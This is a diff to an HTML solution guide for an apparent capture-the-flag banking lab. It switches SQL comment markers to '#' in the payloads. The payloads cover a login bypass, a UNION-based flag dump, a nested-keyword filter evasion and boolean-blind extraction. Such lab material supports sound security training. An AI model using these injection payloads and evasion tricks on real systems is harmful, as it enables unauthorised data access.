@@ -146,11 +146,11 @@ code{background:#1b2444;border:1px solid var(--bd);padding:.06em .4em;border-rad
           </div>
           <div class="slbody">
             <div class="lab">The mitigation at this level</div><p>Nothing filtered. The raw database error is returned to the screen, so a lone quote confirms injection instantly.</p>
-            <div class="lab">How to solve it</div><p>Comment the password check out of the query. <code>--</code> needs a trailing space.</p>
+            <div class="lab">How to solve it</div><p>Comment the password check out of the query. In MySQL, <code>#</code> runs to the end of the line.</p>
             <pre class="code">SELECT id, customer_id, name, role FROM users
-WHERE customer_id = '<span class="inj">BS100234' -- </span>'
+WHERE customer_id = '<span class="inj">BS100234' #</span>'
   AND password_md5 = '…'  <span class="cmt">← commented out, never runs</span></pre>
-            <div class="paywrap"><div class="lab">Payload</div><div class="payload">BS100234' -- </div><div class="paynote">your own Customer ID + any password</div></div>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">BS100234' #</div><div class="paynote">your own Customer ID + any password</div></div>
             
           </div></section>
 <section class="slide level l1">
@@ -392,9 +392,9 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
             <div class="lab">The mitigation at this level</div><p>The term is used exactly as typed, and raw SQL errors are shown. The result grid has 7 columns.</p>
             <div class="lab">How to solve it</div><p>Close the string, then <code>UNION</code> a select from <code>ctf_flags</code> (flag lands in the Remarks cell) — or leak it through an error.</p>
             <pre class="code">... WHERE (from_account_id=:a1 OR to_account_id=:a2)
-    AND remarks LIKE '%<span class="inj">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
+    AND remarks LIKE '%<span class="inj">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
 <span class="cmt">your UNION row joins the result set → another user's flag in the grid</span></pre>
-            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags-- </div><div class="paynote">flag shows in the Remarks column</div></div>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</div><div class="paynote">flag shows in the Remarks column</div></div>
             
           </div></section>
 <section class="slide level l1">
@@ -406,8 +406,8 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
           <div class="slbody">
             <div class="lab">The mitigation at this level</div><p>Strips <code>union select -- # /* */</code> — but only <b>once</b>, case-insensitively. Split or nested keywords survive the single pass; quotes pass through; errors still shown.</p>
             <div class="lab">How to solve it</div><p>Hide the keyword inside itself so one removal rebuilds it.</p>
-            <pre class="code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags-- </span>%'
-<span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags-- </span></pre>
+            <pre class="code">remarks LIKE '%<span class="inj">%' UNIunionON SELselectECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
+<span class="cmt">after one strip pass → ... UNION SELECT ... FROM ctf_flags#</span></pre>
             <div class="paywrap"><div class="lab">Payload</div><div class="payload">UNIunionON  →  UNION     uni/**/on  →  union</div><div class="paynote">then the same UNION / error-based dump</div></div>
             
           </div></section>
@@ -421,9 +421,9 @@ WHERE customer_id = '<span class="inj">BS100234' -- </span>'
             <div class="lab">The mitigation at this level</div><p><code>union</code> is stripped <b>repeatedly</b> until stable (nesting can't rebuild it), and errors are hidden. In-band extraction is dead — but boolean logic still reaches the query.</p>
             <div class="lab">How to solve it</div><p>Ask one yes/no question per character and watch whether any row comes back (boolean-blind). Automate across positions.</p>
             <pre class="code">remarks LIKE '%<span class="inj">%' AND SUBSTRING((SELECT flag FROM ctf_flags
-   WHERE username='&lt;you&gt;'),1,1)='B'-- </span>%'
+   WHERE username='&lt;you&gt;'),1,1)='B'#</span>%'
 <span class="cmt">rows returned → 1st char is 'B'  ·  no rows → wrong guess  → reconstruct char by char</span></pre>
-            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'-- </div><div class="paynote">row present = guess correct</div></div>
+            <div class="paywrap"><div class="lab">Payload</div><div class="payload">%' AND SUBSTRING((SELECT flag FROM ctf_flags WHERE username='&lt;you&gt;'),1,1)='B'#</div><div class="paynote">row present = guess correct</div></div>
             
           </div></section>
 <section class="slide overview">
